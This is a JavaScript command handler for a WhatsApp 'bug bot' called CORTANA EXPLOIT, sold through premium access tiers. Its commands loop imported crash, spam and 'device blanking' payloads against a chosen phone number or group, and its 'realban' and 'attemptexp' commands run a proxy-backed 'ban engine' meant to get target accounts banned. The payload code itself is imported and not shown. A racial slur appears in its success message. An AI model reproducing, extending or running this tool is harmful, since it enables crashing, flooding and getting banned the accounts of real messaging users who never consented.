/**
 * ═══════════════════════════════════════════════════════════════
 * ☠️ CORTANA EXPLOIT - Bug Bot Handler
 * Main command processor for Bug Bot
 * ═══════════════════════════════════════════════════════════════
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const config = require('./config');

// Import all exploit functions
const {
    FcOneMesYgy,
    ElmiForceV1,
    ElmiForceMsgV1,
    TzXAudio,
    SpcmUi,
    BlankSpam,
    BugGb12,
    R9XKillGc
} = require('./bugbot');

// ═══════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Load JSON database file
 */
function loadDatabase(filePath, defaultValue = []) {
    try {
        if (fs.existsSync(filePath)) {
            return JSON.parse(fs.readFileSync(filePath, 'utf8'));
        }
    } catch (e) {
        console.error(`[DB] Error loading ${filePath}:`, e.message);
    }
    return defaultValue;
}

/**
 * Save JSON database file
 */
function saveDatabase(filePath, data) {
    try {
        const dir = path.dirname(filePath);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        return true;
    } catch (e) {
        console.error(`[DB] Error saving ${filePath}:`, e.message);
        return false;
    }
}

// ═══════════════════════════════════════════════════════════════
// MAIN HANDLER EXPORT
// ═══════════════════════════════════════════════════════════════

module.exports = bugHandler = async (sock, m, chatUpdate, store) => {
    try {
        // ═══════ MESSAGE PARSING ═══════
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage?.caption || "" :
                    m.mtype === "videoMessage" ? m.message.videoMessage?.caption || "" :
                        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage?.text || "" :
                            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage?.selectedButtonId || "" :
                                m.mtype === "listResponseMessage" ? m.message.listResponseMessage?.singleSelectReply?.selectedRowId || "" :
                                    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage?.selectedId || "" :
                                        m.mtype === "interactiveResponseMessage" ? (m.msg?.nativeFlowResponseMessage?.paramsJson ?
                                            (() => { try { return JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson); } catch { return {}; } })()?.id || "" : "") :
                                            m.mtype === "messageContextInfo" ? (m.message.buttonsResponseMessage?.selectedButtonId ||
                                                m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text || "") : ""
        ) || "";

        const sender = m.key.fromMe ?
            (sock.user?.id?.split(":")[0] || sock.user?.id) + "@s.whatsapp.net" || sock.user?.id :
            m.key.participant || m.key.remoteJid;

        const senderNumber = sender?.split('@')[0] || "";
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from?.endsWith("@g.us") || false;
        const botNumber = sock.decodeJid ? await sock.decodeJid(sock.user?.id || "") : sock.user?.id || "";

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(" ");
        const q = text;

        // ═══════ DATABASE LOADING ═══════
        let premium = loadDatabase(config.premiumPath);
        let owner = loadDatabase(config.ownerPath);
        const authorizedPath = path.join(__dirname, 'database', 'authorized.json');
        let authorized = loadDatabase(authorizedPath);

        const isPremium = premium.includes(m.sender);
        const isCreator = [botNumber, ...owner, ...(config.owner || [])
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')]
            .includes(m.sender);
        // Check if sender is in authorized database (for realban access)
        const isAuthorized = authorized.includes(senderNumber) || authorized.includes(m.sender);

        // ═══════ VERIFIED BADGE CONTEXT ═══════
        const qchannel = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: config.newsletter.jid,
                    newsletterName: config.newsletter.name,
                    jpegThumbnail: "",
                    caption: `📲 ${config.branding.footer}`,
                    inviteExpiration: 0
                }
            }
        };

        // ═══════ REPLY FUNCTIONS ═══════
        async function zreply(teks) {
            return await sock.sendMessage(m.chat, {
                text: `☠️ *CORTANA EXPLOIT*\n━━━━━━━━━━━━\n${teks}\n\n${config.branding.footer}`,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        }

        const reaction = async (jidss, emoji) => {
            await sock.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            });
        };

        // ═══════ SUCCESS MESSAGE TEMPLATES ═══════
        const cortanaExploitSuccess = async (target, cmdUsed) => {
            const successMsg = `╔══════════════════════╗
║  ☠️ 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐄̸͜𝐗̸͜𝐏̸͜𝐋̸͜𝐎̸͜𝐈̸͜𝐓̸͜ ☠️  ║
╠══════════════════════╣
║ 💀 𝐏͢𝐀͠𝐘͡𝐋͢𝐎͠𝐀͡𝐃 𝐎͢𝐕͠𝐄͡𝐑͢𝐋͠𝐎͡𝐀͢𝐃 💀
║ ✅ Successfully sent to target!
║
║ 🎯 Target: ${target}
║ ⚔️ Command: ${cmdUsed}
║
║ ⚠️ Please wait 10 min before
║ processing another request
║ or you get banned nigga! 🔥
╚══════════════════════╝
${config.branding.footer}`;

            await sock.sendMessage(m.chat, {
                text: successMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        };

        const cortanaBanSuccess = async (target, cmdUsed) => {
            const banMsg = `╔══════════════════════╗
║  🦠 𝐂̸͜𝐎̸͜𝐑̸͜𝐓̸͜𝐀̸͜𝐍̸͜𝐀̸͜ 𝐁̸͜𝐀̸͜𝐍̸͜ 🦠  ║
╠══════════════════════╣
║ 🔥 Oh! oo, Cortana is attacking
║ using proxies on your target!
║
║ 🎯 Target: ${target}
║ ⚔️ Method: ${cmdUsed}
║
║ ⏳ Wait for some hours, I'll
║ notify you with progress and
║ action taken!
║
║ 💬 Got questions? Reach out:
║ 📲 t.me/eduqariz
╚══════════════════════╝
☠️ CORTANA EXPLOIT | © 2026`;

            await sock.sendMessage(m.chat, {
                text: banMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: config.newsletter.jid,
                        newsletterName: config.newsletter.name,
                        serverMessageId: config.newsletter.serverMessageId
                    }
                }
            });
        };

        // ═══════ COMMAND SWITCH ═══════
        switch (command) {

            // ═══════ MENU COMMAND ═══════
            case 'menu': {
                await reaction(m.chat, "😈");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "✅");

                const accessLevel = isAuthorized ? "🔓 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝" : isCreator ? "𝐎𝐰𝐧𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬";
                const menu = `\`╭─[ ☠️ 𝐂𝐎𝐑𝐓𝐀𝐍𝐀 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ]
│ Version : ${config.version}
│ Status  : ${config.status.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞'}
│ Access  : ${accessLevel}
╰────────────────㋡︎\`

\`╭─[ �͢�͠�͡�͢�͠�͡�͢�-�͢�͠�͡�͢𝐬 ]
│ ▢ ${prefix}oneterm <target>
│ ▢ ${prefix}cortanacall <target>
│ ▢ ${prefix}trashem <target>
╰────❍\`

\`╭─[ 𝐂͢𝐫͠𝐚͡𝐬͢𝐡-𝐇͢𝐨͠𝐦͡𝐞 ]
│ ▢ ${prefix}newyear <target>
│ ▢ ${prefix}edudevice <target>
╰────❍\`

\`╭─[ 𝐃͢𝐞͠𝐥͡𝐚͢𝐲-𝐈͢𝐧͠𝐯͡𝐢͢𝐬 ]
│ ▢ ${prefix}kindiki <target>
│ ▢ ${prefix}cortanazap <target>
│ ▢ ${prefix}zeroreturn <target>
╰────❍\`

\`╭─[ 𝐆͢𝐫͠𝐨͡𝐮͢𝐩 𝐂͢𝐦͠𝐝͡𝐬 ]
│ ▢ ${prefix}kufeni - inplace
│ ▢ ${prefix}fuckall - inplace
│ ▢ ${prefix}cookall - inplace
╰────❍\`

\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 ]
│ ▢ ${prefix}realban<target>
│ ▢ ${prefix}attemptexp<target>
╰────❍\`

\`╭─[ 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗͢ 𝐁͠𝐎͡𝐔͢𝐍͠𝐓͡𝐘 ]
│ ▢ ${prefix}forcemessage
╰────❍\`

\`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐂͢𝐦͠𝐝͡𝐬 ]
│ ▢ ${prefix}addprem <num>
│ ▢ ${prefix}delprem <num>
│ ▢ ${prefix}listprem
╰────❍\`
`;

                await sock.sendMessage(m.chat, {
                    text: menu,
                    contextInfo: {
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: config.newsletter.jid,
                            newsletterName: config.newsletter.name,
                            serverMessageId: config.newsletter.serverMessageId
                        }
                    }
                }, { quoted: qchannel });
                break;
            }

            // ═══════ EXPLOIT COMMANDS (NO ALIASES) ═══════

            // .oneterm - Payment crash
            case 'oneterm': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                for (let i = 0; i < 5; i++) {
                    await FcOneMesYgy(sock, target);
                    await sleep(100);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .cortanacall - Encrypted call exploit
            case 'cortanacall': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.defaultLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .trashem - Payment message exploit
            case 'trashem': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                for (let i = 0; i < 5; i++) {
                    await ElmiForceMsgV1(sock, target);
                    await sleep(100);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .newyear - Crash home combo
            case 'newyear': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BlankSpam(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BugGb12(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await ElmiForceV1(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .edudevice - Device blanking
            case 'edudevice': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BlankSpam(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .kindiki - Delay hard audio
            case 'kindiki': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.defaultLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .cortanazap - Delay invisible combo (TzxAudio + SpcmUi)
            case 'cortanazap': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "⚡");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.defaultLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await SpcmUi(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await FcOneMesYgy(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // .zeroreturn - Silent delay crash (TzxAudio heavy)
            case 'zeroreturn': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!text) {
                    return zreply(`wrong usage, please include the format .${command} 254***** for execution`);
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.startsWith('0')) {
                    return zreply(`Format: ${prefix + command} 628xxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                if (config.blockedNumbers.includes(target)) {
                    return zreply("*no, this target is protected*");
                }

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "💀");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await TzXAudio(sock, target);
                    await TzXAudio(sock, target);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                    await BlankSpam(sock, target);
                    await TzXAudio(sock, target);
                    await sleep(config.exploitSettings.delayBetweenCalls);
                }

                await cortanaExploitSuccess(bijipler, command);
                break;
            }

            // ═══════ GROUP COMMANDS (NO ALIASES) ═══════

            // .kufeni - Group payment crash
            case 'kufeni': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const target = m.chat;
                await R9XKillGc(sock, target, false);

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // .fuckall - Group newsletter spam
            case 'fuckall': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await sleep(1000);
                }

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // .cookall - Same as fuckall
            case 'cookall': {
                if (!m.isGroup) return zreply(`*this is for groups only*`);
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "✅");

                const loopCount = config.exploitSettings.maxLoopCount;
                for (let i = 0; i < loopCount; i++) {
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await BugGb12(sock, m.chat);
                    await sleep(1000);
                }

                await cortanaExploitSuccess(m.chat.split('@')[0], command);
                break;
            }

            // ═══════ BAN EXPLOIT COMMANDS ═══════

            // .realban - MAXIMUM INTENSITY (Authorized DB Only)
            case 'realban': {
                // Check if user is in authorized database
                if (!isAuthorized) {
                    const chaoticDenial = `╔══════════════════════════════════════╗
║ 💀 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐄͢𝐗͠𝐏͡𝐋͢𝐎͠𝐈͡𝐓 💀            ║
╠══════════════════════════════════════╣
║ 🦄 WOAHH THERE PARTNER! 🔥           ║
║                                      ║
║ You ain't got the JUICE for this     ║
║ level of CHAOS! 😈💥                 ║
║                                      ║
║ 🌸 This command requires AUTHORIZED  ║
║ access from the dev! 🌸              ║
║                                      ║
║ 💬 Message the dev for access:       ║
║ 📲 t.me/eduqariz                     ║
╚══════════════════════════════════════╝
☠️ CORTANA EXPLOIT | © 2026`;
                    return sock.sendMessage(m.chat, {
                        text: chaoticDenial,
                        contextInfo: {
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: config.newsletter.jid,
                                newsletterName: config.newsletter.name,
                                serverMessageId: config.newsletter.serverMessageId
                            }
                        }
                    });
                }

                if (!text) {
                    const usageError = `╔══════════════════════════════════════╗
║ 🌸 CORTANA EXPLOIT 🌸                ║
╠══════════════════════════════════════╣
║ ⚠️ Invalid format!                   ║
║                                      ║
║ Usage: ${prefix}realban 254712345678 ║
║ (International format, 10+ digits)   ║
╚══════════════════════════════════════╝
📲 t.me/eduqariz | © 2026`;
                    return sock.sendMessage(m.chat, { text: usageError });
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.length < 10 || bijipler.startsWith('0')) {
                    return zreply(`⚠️ Use international format: ${prefix}realban 254xxxxxxxxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "💀");
                await sleep(400);
                await reaction(m.chat, "🔥");

                try {
                    const { CortanaDoomsday } = require('./ban-engine');
                    const banEngine = new CortanaDoomsday();

                    const initMsg = `╔══════════════════════════════════════╗
║ ☠️ CORTANA REALBAN ☠️                ║
╠══════════════════════════════════════╣
║ 🎯 Target: ${bijipler.padEnd(25)}║
║ ⚡ Mode: MAXIMUM INTENSITY            ║
║ 🔥 Proxies: ALL AVAILABLE            ║
║ ⏳ Duration: EXTENDED                ║
║                                      ║
║ 💀 Initializing doomsday engine...   ║
╚══════════════════════════════════════╝`;
                    await sock.sendMessage(m.chat, { text: initMsg });

                    // Execute MAXIMUM intensity ban
                    const result = await banEngine.executeRealBan(target);

                    await reaction(m.chat, "✅");

                    const successMsg = `╔══════════════════════════════════════╗
║ ☠️ CORTANA REALBAN SUCCESS ☠️        ║
╠══════════════════════════════════════╣
║ 💀 PAYLOAD DELIVERED 💀              ║
║                                      ║
║ 🎯 Target: ${bijipler.padEnd(25)}║
║ ⚔️ Method: REALBAN                   ║
║ 🔥 Intensity: MAXIMUM                ║
║                                      ║
║ ⏳ Wait 10 min before next request   ║
╚══════════════════════════════════════╝
📲 t.me/eduqariz | © 2026`;
                    await sock.sendMessage(m.chat, {
                        text: successMsg,
                        contextInfo: {
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: config.newsletter.jid,
                                newsletterName: config.newsletter.name,
                                serverMessageId: config.newsletter.serverMessageId
                            }
                        }
                    });

                } catch (error) {
                    console.error('[REALBAN] Error:', error);
                    await reaction(m.chat, "❌");
                    zreply(`*Realban execution failed: ${error.message}*`);
                }
                break;
            }

            // .attemptexp - REDUCED INTENSITY (Connected Users)
            case 'attemptexp': {
                // Works for connected users (premium/owner) but not authorized DB users
                if (!isPremium && !isCreator) {
                    return zreply(`*⚠️ This command is for connected users only*\n\nConnect your bot first!`);
                }

                if (!text) {
                    const usageError = `╔══════════════════════════════════════╗
║ 🌸 CORTANA EXPLOIT 🌸                ║
╠══════════════════════════════════════╣
║ ⚠️ Invalid format!                   ║
║                                      ║
║ Usage: ${prefix}attemptexp 254712345678
║ (International format, 10+ digits)   ║
╚══════════════════════════════════════╝
📲 t.me/eduqariz | © 2026`;
                    return sock.sendMessage(m.chat, { text: usageError });
                }

                let bijipler = text.replace(/[^0-9]/g, '');
                if (bijipler.length < 10 || bijipler.startsWith('0')) {
                    return zreply(`⚠️ Use international format: ${prefix}attemptexp 254xxxxxxxxx`);
                }

                let target = bijipler + '@s.whatsapp.net';

                await reaction(m.chat, "🦠");
                await sleep(400);
                await reaction(m.chat, "☠️");
                await sleep(400);
                await reaction(m.chat, "⚡");

                try {
                    const { CortanaDoomsday } = require('./ban-engine');
                    const banEngine = new CortanaDoomsday();

                    const initMsg = `╔══════════════════════════════════════╗
║ ☠️ CORTANA ATTEMPTEXP ☠️             ║
╠══════════════════════════════════════╣
║ 🎯 Target: ${bijipler.padEnd(25)}║
║ ⚡ Mode: REDUCED INTENSITY            ║
║ 🔄 Proxies: ~50                       ║
║ ⏳ Duration: <40 minutes              ║
║                                      ║
║ ⏳ Initializing attack...             ║
╚══════════════════════════════════════╝`;
                    await sock.sendMessage(m.chat, { text: initMsg });

                    // Execute REDUCED intensity ban (50 proxies, <40min)
                    const result = await banEngine.executeAttemptExp(target);

                    await reaction(m.chat, "✅");

                    const successMsg = `╔══════════════════════════════════════╗
║ ☠️ CORTANA ATTEMPTEXP SUCCESS ☠️     ║
╠══════════════════════════════════════╣
║ ⚡ PAYLOAD SENT ⚡                     ║
║                                      ║
║ 🎯 Target: ${bijipler.padEnd(25)}║
║ ⚔️ Method: ATTEMPTEXP                ║
║ 🔥 Intensity: REDUCED                ║
║                                      ║
║ ⏳ Wait for results...               ║
║                                      ║
║ 💬 Want MAX power? Get authorized:   ║
║ 📲 t.me/eduqariz                     ║
╚══════════════════════════════════════╝`;
                    await sock.sendMessage(m.chat, {
                        text: successMsg,
                        contextInfo: {
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: config.newsletter.jid,
                                newsletterName: config.newsletter.name,
                                serverMessageId: config.newsletter.serverMessageId
                            }
                        }
                    });

                } catch (error) {
                    console.error('[ATTEMPTEXP] Error:', error);
                    await reaction(m.chat, "❌");
                    zreply(`*Attemptexp execution failed: ${error.message}*`);
                }
                break;
            }

            // .forcemessage - Placeholder (awaiting code from user)
            case 'forcemessage': {
                if (!isAuthorized) {
                    const chaoticDenial = `╔══════════════════════════════════════╗
║ 💀 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗 𝐁͢𝐎͠𝐔͡𝐍͢𝐓͠𝐘 💀           ║
╠══════════════════════════════════════╣
║ 🦄 ACCESS DENIED! 🔥                 ║
║                                      ║
║ This is a BOUNTY-level command! 😈   ║
║                                      ║
║ 💬 Message the dev for access:       ║
║ 📲 t.me/eduqariz                     ║
╚══════════════════════════════════════╝
☠️ CORTANA EXPLOIT | © 2026`;
                    return sock.sendMessage(m.chat, { text: chaoticDenial });
                }

                // TODO: Implement forcemessage (awaiting code from user)
                return zreply(`*🚧 Force message coming soon... Stay tuned! 🚧*`);
            }

            // ═══════ OWNER COMMANDS ═══════
            case 'addprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (!args[0]) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = q.split("|")[0].replace(/[^0-9]/g, '');
                if (phoneNumber.length < 10) return zreply(`Invalid number`);

                const anj = phoneNumber + `@s.whatsapp.net`;

                try {
                    let ceknya = await sock.onWhatsApp(anj);
                    if (!ceknya || ceknya.length == 0) {
                        return zreply(`Number not registered on WhatsApp`);
                    }
                } catch (error) {
                    return zreply(`Error checking WhatsApp number`);
                }

                premium.push(anj);
                saveDatabase(config.premiumPath, premium);
                zreply(`*Successfully added premium access*`);
                break;
            }

            case 'delprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                if (args.length < 1) return zreply(`— example: ${prefix + command} 62xxx`);

                const phoneNumber = args[0].replace(/[^0-9]/g, '');
                const targetJid = phoneNumber + "@s.whatsapp.net";
                const index = premium.indexOf(targetJid);

                if (index !== -1) {
                    premium.splice(index, 1);
                    saveDatabase(config.premiumPath, premium);
                    zreply(`*Successfully removed premium access*`);
                } else {
                    zreply(`User not found in premium database`);
                }
                break;
            }

            case 'listprem': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                let teks = '*PREMIUM USERS:*\n\n';
                for (let i = 0; i < premium.length; i++) {
                    teks += `${i + 1}. ${premium[i].split('@')[0]}\n`;
                }
                zreply(teks);
                break;
            }

            default:
                // Unknown command - do nothing
                break;
        }

    } catch (err) {
        console.error("[BugHandler] Error:", err);
    }
};

// Hot reload support
const file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
